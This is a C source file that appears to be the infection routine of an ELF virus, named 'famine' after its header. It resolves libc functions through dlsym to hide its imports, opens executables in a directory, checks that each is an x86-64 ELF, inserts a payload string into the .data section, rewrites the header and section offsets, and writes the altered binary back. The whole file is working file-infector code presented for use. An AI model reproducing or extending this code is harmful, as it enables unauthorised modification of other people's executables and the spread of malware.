#include "famine.h"
#include <signal.h>

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry > offset)
      header->e_entry += toAdd;
    if (header->e_phoff > offset)
      header->e_phoff += toAdd;
    if (header->e_shoff > offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset > offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset > offset)
            program->p_offset += toAdd;
        if (program->p_paddr > offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

static int  appendSignature(struct bfile file, size_t offset, size_t  (*strlen)(const char *),
void *(*memmove)(void *, const void *, size_t), const char *payload, void *(*memcpy)(void *, const void *, size_t)) {
  size_t  toAdd;

  toAdd = strlen(payload) + 1;
  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
  memcpy(((void *)file.header) + offset, payload, toAdd);
  return (0);
}

static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header, int (*strcmp)(const char *, const char *)) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;
  char        dataName[] = ".data";

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
    pointer += 1;
  return (pointer);
}

int  infection(void *(*dlsym)(void *, const char *), void *handle,
const char *dirname,  const char *filename, const char *payload) {
  void    *(*malloc)(size_t);
  char    *(*strcpy)(char *, const char *);
  char    *(*strcat)(char *, const char *);
  size_t  (*strlen)(const char *);
  int     (*open)(const char *, int);
  int     (*close)(int);
  void    (*free)(void *);
  int     (*fstat)(int, int, struct stat *);
  void    (*raise)(int);
  void    *(*mmap)(void *, size_t, int, int, int, off_t);
  int     (*munmap)(void *, size_t);
  int     (*strcmp)(const char *, const char *);
  void    *(*memmove)(void *, const void *, size_t);
  void    *(*memcpy)(void *, const void *, size_t);
  ssize_t (*write)(int, const void *, size_t);
  char    mallocName[] = "malloc";
  char    strcpyName[] = "strcpy";
  char    memcpyName[] = "memcpy";
  char    strcatName[] = "strcat";
  char    strlenName[] = "strlen";
  char    openName[] = "open";
  char    closeName[] = "close";
  char    freeName[] = "free";
  char    fstatName[] = "__fxstat";
  char    mmapName[] = "mmap";
  char    munmapName[] = "munmap";
  char    raiseName[] = "raise";
  char    strcmpName[] = "strcmp";
  char    memmoveName[] = "memmove";
  char    writeName[] = "write";
  char    slash[] = "/";

  malloc = dlsym(handle, mallocName);
  strcpy = dlsym(handle, strcpyName);
  strcat = dlsym(handle, strcatName);
  open = dlsym(handle, openName);
  close = dlsym(handle, closeName);
  free = dlsym(handle, freeName);
  fstat = dlsym(handle, fstatName);
  mmap = dlsym(handle, mmapName);
  munmap = dlsym(handle, munmapName);
  strlen = dlsym(handle, strlenName);
  raise = dlsym(handle, raiseName);
  strcmp = dlsym(handle, strcmpName);
  memmove = dlsym(handle, memmoveName);
  write = dlsym(handle, writeName);
  memcpy = dlsym(handle, memcpyName);

  int         fd;
  char        *tmp;
  struct stat stats;
  struct bfile file;
  Elf64_Shdr  *data;
  Elf64_Off   offset;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, slash);
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (1);
  }
  free(tmp);
  if (fstat(1, fd, &stats) == -1) {
    close(fd);
    return (-1);
  }
  file.size = stats.st_size;
  if ((file.header = mmap(NULL, file.size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  if ((size_t)(file.size) < sizeof(Elf64_Ehdr) || !isCompatible(file.header->e_ident, file.header->e_machine))
    return (1);
  data = getDataSectionHeader(file.header, strcmp);
  data->sh_size += strlen(payload) + 1;
  offset = data->sh_offset;
  appendSignature(file, offset + data->sh_size - (strlen(payload) + 1), strlen, memmove, payload, memcpy);
  file.size += strlen(payload) + 1;
  updateOffsets(file.header, offset + data->sh_size - strlen(payload) - 1, strlen(payload) + 1);
  write(fd, file.header, file.size);
  close(fd);
  munmap(file.header, file.size);
  return (0);
}
